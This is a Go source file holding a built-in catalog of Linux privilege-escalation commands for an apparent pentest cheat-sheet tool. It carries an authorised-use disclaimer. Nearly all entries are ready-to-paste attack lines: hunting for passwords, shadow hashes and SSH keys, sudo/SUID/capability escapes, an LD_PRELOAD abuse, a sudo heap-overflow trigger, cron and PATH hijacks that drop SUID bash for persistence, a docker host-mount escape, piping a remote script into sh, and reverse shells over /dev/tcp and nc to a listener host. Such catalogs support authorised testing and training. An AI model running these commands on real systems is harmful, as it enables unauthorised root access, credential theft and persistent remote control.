package main

// linuxCatalog is the built-in set of Linux local privilege-escalation
// commands, served by --web as the "Linux" mode alongside the web and AD
// catalogs. Like the payload catalog it is a cheat sheet, not an exploit
// launcher: each entry's "command" is the bare line you paste into a shell on
// a box you already have a foothold on, with {TOKEN} placeholders you fill in
// (a SUID binary name, your listener host/port, a writable path).
//
// It is ordered along the usual local-privesc workflow:
//   enumerate the box → read the obvious wins (sudo, SUID, capabilities,
//   cron, writable service units) → reach for kernel / automated enumeration
//   → stabilise the shell you land.
//
// Use only on systems you are authorised to test (your own labs, CTF/HTB
// targets, or an engagement with a signed scope). The same out-of-scope gate
// that guards the web and AD modes applies to anything run from here.

// linux-specific placeholders woven into the templates below.
var (
	suidBinFlag = Flag{Flag: "{BIN}", Name: "Target binary", Kind: KindString, Placeholder: "find",
		Desc: "The SUID/sudo-allowed program to abuse — look it up on GTFOBins for the exact escape"}
	lhostFlag = Flag{Flag: "{LHOST}", Name: "Listener host", Kind: KindString, Placeholder: "10.10.14.1",
		Desc: "Your attacking machine's IP (tun0 on HTB/VPN labs) that the reverse shell connects back to"}
	lportFlag = Flag{Flag: "{LPORT}", Name: "Listener port", Kind: KindString, Value: "4444",
		Desc: "Port your nc/listener is bound to for the callback"}
	writePathFlag = Flag{Flag: "{PATH}", Name: "Writable path", Kind: KindString, Placeholder: "/usr/local/bin/backup.sh",
		Desc: "The writable file/script a privileged process (cron, service, PATH lookup) will execute"}
)

var linuxCatalog = []Tool{
	// ── enum · system: where am I, who am I, what can I reach ──────────────
	payloadEntry("whoami / id", "enum · system",
		"First question on every box — your uid/gid and, crucially, your group memberships (docker, lxd, disk, adm all lead to root)",
		`id; whoami; groups`),
	payloadEntry("kernel & distro", "enum · system",
		"Kernel version and release feed a kernel-exploit suggester; an old kernel is a direct path to root",
		`uname -a; cat /etc/os-release; cat /proc/version`),
	payloadEntry("hostname & networking", "enum · system",
		"Internal interfaces, listening ports and routes — reveals pivots and services bound to localhost only",
		`hostname; ip a; ip route; ss -tulpn 2>/dev/null || netstat -tulpn`),
	payloadEntry("running processes", "enum · system",
		"Processes running as root are prime targets — note anything invoking a script, wildcard or relative path you can influence",
		`ps aux --forest`),
	payloadEntry("env & PATH", "enum · system",
		"A writable or '.'-containing PATH, or secrets leaked into the environment, are quick wins",
		`env; echo "$PATH"`),

	// ── enum · users & creds: cheap credentials lying around ───────────────
	payloadEntry("world-readable config secrets", "enum · users & creds",
		"Greps the common config/web roots for passwords dropped into files — the single most common real-world privesc",
		`grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /var/www /opt /home 2>/dev/null | head`),
	payloadEntry("shell history", "enum · users & creds",
		"Admins paste passwords into sudo/mysql/ssh commands; history files remember them",
		`cat ~/.bash_history ~/.zsh_history 2>/dev/null; find / -name '*_history' 2>/dev/null`),
	payloadEntry("SSH & private keys", "enum · users & creds",
		"A readable private key or an authorized_keys you can write is lateral movement or a persistence foothold",
		`find / \( -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' \) 2>/dev/null`),
	payloadEntry("readable /etc/shadow", "enum · users & creds",
		"If shadow is readable (misconfig or your group), crack the hashes offline instead of escalating live",
		`ls -l /etc/shadow; cat /etc/shadow 2>/dev/null`),
	payloadEntry("world-writable files & dirs", "enum · users & creds",
		"Writable files owned by root, or writable dirs on a privileged PATH, convert directly into code execution",
		`find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'; find / -perm -0002 -type d 2>/dev/null | head`),

	// ── privesc · sudo: the single most productive check ───────────────────
	payloadEntry("sudo -l", "privesc · sudo",
		"Lists what the current user may run as root — read every entry against GTFOBins; NOPASSWD and env_keep are gold",
		`sudo -l`),
	Tool{
		Name: "sudo GTFOBins escape", Binary: `sudo {BIN}`, Category: "privesc · sudo",
		Desc:  "Template for abusing a binary sudo lets you run — replace with the GTFOBins 'sudo' escape (e.g. for find: sudo find . -exec /bin/sh \\; -quit)",
		Flags: []Flag{suidBinFlag},
	},
	payloadEntry("sudo LD_PRELOAD (env_keep)", "privesc · sudo",
		"When sudo -l shows env_keep+=LD_PRELOAD: compile a .so with a setuid(0) constructor and preload it into any allowed command",
		`sudo LD_PRELOAD=/tmp/x.so {BIN}`, Flag{Flag: "{BIN}", Name: "Allowed binary", Kind: KindString, Placeholder: "apache2",
			Desc: "Any command sudo lets you run — the preloaded library runs as root before it does"}),
	payloadEntry("sudo CVE-2021-3156 check (Baron Samedit)", "privesc · sudo",
		"Heap overflow in sudo < 1.9.5p2 reachable by ANY local user, no sudo rights needed — this crashes if vulnerable",
		`sudoedit -s '\' $(python3 -c 'print("A"*1000)')`),

	// ── privesc · suid/sgid: setuid-root helpers you can misuse ────────────
	payloadEntry("find SUID binaries", "privesc · suid/sgid",
		"Lists every setuid binary — compare each non-standard one against GTFOBins' 'suid' section",
		`find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;`),
	payloadEntry("find SGID binaries", "privesc · suid/sgid",
		"setgid binaries can grant a privileged group (e.g. shadow, disk) — the escape is often the same GTFOBins entry",
		`find / -perm -2000 -type f 2>/dev/null -exec ls -la {} \;`),
	Tool{
		Name: "SUID GTFOBins escape", Binary: `{BIN}`, Category: "privesc · suid/sgid",
		Desc:  "Template for a SUID-root binary — paste the GTFOBins 'suid' payload (e.g. find: find . -exec /bin/sh -p \\; -quit). -p keeps the euid",
		Flags: []Flag{suidBinFlag},
	},
	payloadEntry("drop a SUID bash (once you're root)", "privesc · suid/sgid",
		"Persistence after a one-shot root exec: copy bash and set it SUID so `bash -p` returns a root shell any time",
		`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p`),

	// ── privesc · capabilities: fine-grained root powers ───────────────────
	payloadEntry("list file capabilities", "privesc · capabilities",
		"Capabilities grant slices of root to non-SUID binaries — cap_setuid is instant root, cap_dac_read_search reads any file",
		`getcap -r / 2>/dev/null`),
	payloadEntry("abuse cap_setuid on python", "privesc · capabilities",
		"If python/perl/ruby carries cap_setuid+ep, set uid 0 in-process and spawn a root shell",
		`./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`),
	payloadEntry("abuse cap_dac_read_search", "privesc · capabilities",
		"This capability bypasses file-read permission checks — use the GTFOBins entry for the binary to read /etc/shadow or root's keys",
		`getcap -r / 2>/dev/null | grep cap_dac`),

	// ── privesc · cron: scheduled root jobs you can hijack ─────────────────
	payloadEntry("enumerate cron", "privesc · cron",
		"System crontabs and cron.* dirs — a root job that runs a writable script, or uses a wildcard/relative path, is yours",
		`cat /etc/crontab; ls -la /etc/cron.* /var/spool/cron 2>/dev/null`),
	Tool{
		Name: "hijack writable cron script", Binary: `echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {PATH}`, Category: "privesc · cron",
		Desc:  "Append a SUID-bash dropper to a script a root cron runs; wait for the next tick, then /tmp/rootbash -p",
		Flags: []Flag{writePathFlag},
	},
	payloadEntry("watch for hidden jobs (pspy)", "privesc · cron",
		"Short-interval or non-crontab jobs are invisible in crontab files; pspy shows every process start without root",
		`./pspy64 -pf -i 1000`),
	payloadEntry("cron wildcard injection (tar/rsync)", "privesc · cron",
		"A root cron like `tar czf b.tgz *` in a writable dir: plant files named as flags so tar runs your command",
		`echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > shell.sh; echo "" > '--checkpoint=1'; echo "" > '--checkpoint-action=exec=sh shell.sh'`),

	// ── privesc · services, PATH, NFS, containers ──────────────────────────
	payloadEntry("writable systemd units / service bins", "privesc · services & paths",
		"A writable .service file or the ExecStart binary it names lets you run code as root on restart/boot",
		`find /etc/systemd/ /lib/systemd/ -writable -type f 2>/dev/null; systemctl list-units --type=service`),
	Tool{
		Name: "PATH hijack (relative call)", Binary: `echo -e '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' > {PATH} && chmod +x {PATH}`, Category: "privesc · services & paths",
		Desc: "When a SUID/root program calls a command by name (not full path): drop a same-named script in a writable dir that's earlier in its PATH",
		Flags: []Flag{Flag{Flag: "{PATH}", Name: "Fake binary path", Kind: KindString, Placeholder: "/tmp/service",
			Desc: "Writable dir on the target's PATH + the bare command name it calls (e.g. /tmp/service)"}},
	},
	payloadEntry("NFS no_root_squash abuse", "privesc · services & paths",
		"An export with no_root_squash lets you mount it and plant a root-owned SUID binary from your own box",
		`showmount -e {LHOST}; echo 'mount it, then: cp /bin/bash ./rb && chmod +s ./rb (as root on your box)'`, lhostFlag),
	payloadEntry("docker / lxd group → root", "privesc · services & paths",
		"Membership of the docker group is root-equivalent: mount the host filesystem into a container you control",
		`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`),
	payloadEntry("container / sandbox checks", "privesc · services & paths",
		"Tells you whether you're in a container (and whether it's privileged) before you waste time on host-only vectors",
		`cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null; capsh --print 2>/dev/null`),

	// ── privesc · kernel & automated enumeration ───────────────────────────
	payloadEntry("linpeas (all-in-one)", "privesc · automated",
		"The standard automated enumerator — highlights every vector above colour-coded by likelihood; start here if blind",
		`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`),
	payloadEntry("LinEnum", "privesc · automated",
		"Lighter, quieter alternative to linpeas when you want a quick structured sweep",
		`./LinEnum.sh -t`),
	payloadEntry("linux-exploit-suggester", "privesc · automated",
		"Maps the running kernel/package versions to known local-root CVEs with exploit links",
		`./les.sh`),
	payloadEntry("GTFOBins lookup", "privesc · automated",
		"The reference every sudo/SUID/capability escape above comes from — look up a binary to get its exact payload",
		`xdg-open https://gtfobins.github.io/#{BIN} 2>/dev/null; echo https://gtfobins.github.io/#{BIN}`, suidBinFlag),

	// ── post · stabilise the shell you landed ──────────────────────────────
	payloadEntry("upgrade to a full TTY", "post · shell",
		"Turns a raw reverse shell into an interactive PTY so tab-completion, arrows, sudo and su actually work",
		`python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm; stty raw -echo`),
	payloadEntry("bash reverse shell", "post · shell",
		"The default callback one-liner — run `nc -lvnp {LPORT}` on your box first",
		`bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`, lhostFlag, lportFlag),
	payloadEntry("nc / mkfifo reverse shell", "post · shell",
		"Fallback for boxes whose nc lacks -e and whose bash can't do /dev/tcp",
		`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f`, lhostFlag, lportFlag),
}
